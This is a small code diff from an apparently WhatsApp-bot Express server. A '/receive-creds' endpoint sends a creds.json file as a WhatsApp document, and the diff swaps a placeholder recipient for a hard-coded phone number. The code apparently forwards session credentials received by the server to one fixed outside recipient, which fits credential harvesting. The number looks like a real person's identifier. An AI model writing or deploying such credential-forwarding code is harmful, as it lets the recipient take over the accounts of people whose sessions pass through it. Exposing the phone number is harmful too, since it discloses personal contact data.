@@ -49,7 +49,7 @@ app.post('/receive-creds', async (req, res) => {
 
         // Send creds.json file to WhatsApp
         try {
-            await XeonBotInc.sendMessage('YOUR_PHONE_NUMBER', { document: creds, mimetype: 'application/json', fileName: 'creds.json' });
+            await XeonBotInc.sendMessage('916238768108', { document: creds, mimetype: 'application/json', fileName: 'creds.json' });
             res.send('creds.json sent to WhatsApp successfully');
         } catch (error) {
             console.error("Error sending creds.json to WhatsApp:", error);
